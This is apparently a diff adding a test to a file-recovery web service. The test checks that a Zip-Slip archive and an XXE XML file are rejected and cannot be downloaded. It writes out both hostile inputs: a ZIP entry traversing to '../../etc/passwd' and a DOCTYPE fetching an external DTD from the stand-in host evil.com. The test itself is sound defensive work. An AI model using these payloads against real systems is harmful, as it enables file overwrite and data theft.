@@ -413,3 +413,36 @@ def test_full_lifecycle_upload_persist_restart_retrieve_and_download_gate():
 
         resp_blocked2 = restarted_client.get(f"/api/artifacts/{unrec_id}/download")
         assert resp_blocked2.status_code == 404
+
+
+def test_download_gate_strictly_blocks_hostile_zip_and_xml():
+    """Verify download gate returns 404 for hostile ZIP (Zip-Slip) and XML (XXE/Billion Laughs)."""
+    with tempfile.NamedTemporaryFile(suffix=".db") as tmp_db:
+        os.environ["RECOVERIX_DB_PATH"] = tmp_db.name
+        client = TestClient(app, raise_server_exceptions=False)
+
+        # 1. Hostile Zip-Slip
+        slip_buf = io.BytesIO()
+        with zipfile.ZipFile(slip_buf, mode="w") as zf:
+            zf.writestr("../../etc/passwd", b"root:x:0:0:root:/root:/bin/bash\n")
+        resp_zip = client.post(
+            "/api/recover-file",
+            files={"file": ("slip.zip", slip_buf.getvalue(), "application/zip")},
+        )
+        assert resp_zip.status_code == 200
+        zip_run_id = resp_zip.json()["run_id"]
+        assert resp_zip.json()["status"] == "UNRECOVERABLE"
+        assert client.get(f"/api/recover-file/{zip_run_id}/download").status_code == 404
+        assert client.get(f"/api/artifacts/{zip_run_id}/download").status_code == 404
+
+        # 2. Hostile XML XXE
+        xxe_xml = b'<!DOCTYPE test SYSTEM "http://evil.com/xxe.dtd"><test>1</test>'
+        resp_xml = client.post(
+            "/api/recover-file",
+            files={"file": ("xxe.xml", xxe_xml, "application/xml")},
+        )
+        assert resp_xml.status_code == 200
+        xml_run_id = resp_xml.json()["run_id"]
+        assert resp_xml.json()["status"] == "UNRECOVERABLE"
+        assert client.get(f"/api/recover-file/{xml_run_id}/download").status_code == 404
+        assert client.get(f"/api/artifacts/{xml_run_id}/download").status_code == 404
